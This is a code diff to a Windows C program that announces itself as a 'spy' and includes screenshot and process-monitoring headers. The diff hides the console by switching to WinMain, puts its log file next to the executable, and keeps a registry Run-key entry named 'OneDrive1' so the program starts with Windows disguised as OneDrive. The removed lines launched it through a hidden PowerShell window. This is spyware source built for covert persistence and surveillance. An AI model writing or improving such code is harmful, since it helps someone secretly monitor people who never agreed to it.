@@ -3,6 +3,7 @@
 #include<signal.h>
 #include "screenshot.h"
 #include "process.h"
+#include<WinBase.h>
 
 
 int ABORT = 0;
@@ -87,22 +88,32 @@ LRESULT CALLBACK wndproc(HWND window, UINT message, WPARAM wparam, LPARAM lparam
 }
 
 
-int main(int ac, char** av) {
+// using WinMain to hide console window
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 	fprintf(stderr, "[+] start spy\n");
 	// get current path of the program
 	char path[MAX_PATH];
 	char folder[MAX_PATH];
-	GetCurrentDirectoryA(MAX_PATH, folder);
 	GetModuleFileNameA(NULL, path, MAX_PATH);	
+
+	// change current directory to the directory of the program
+	// so that we can create log file in the same directory
+	// copy path of the program to folder, then remove the name of the program
+	strcpy_s(folder, sizeof(folder), path);
+	char* p = strrchr(folder, '\\');
+	if (p) {
+		*p = 0;
+		SetCurrentDirectoryA(folder);
+	}
+
+
 	fprintf(stderr, "[+] path: %s\n", path);
 	// make program auto start when windows start
-	char command[1024];
-	sprintf_s(command, sizeof(command), "PowerShell -Command \"Start-Process '%s' -WindowStyle Hidden -WorkingDirectory '%s'\"", path, folder);
 	HKEY hKey = NULL;
 	LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
 	if (res == ERROR_SUCCESS) {
 		// create new registry key
-		RegSetValueExA(hKey, (LPCSTR)"OneDrive1", 0, REG_SZ, (unsigned char*)command, strlen(command));
+		RegSetValueExA(hKey, (LPCSTR)"OneDrive1", 0, REG_SZ, (unsigned char*)path, strlen(path));
 		RegCloseKey(hKey);
 		printf("[+] program added to auto start\n");
 	}
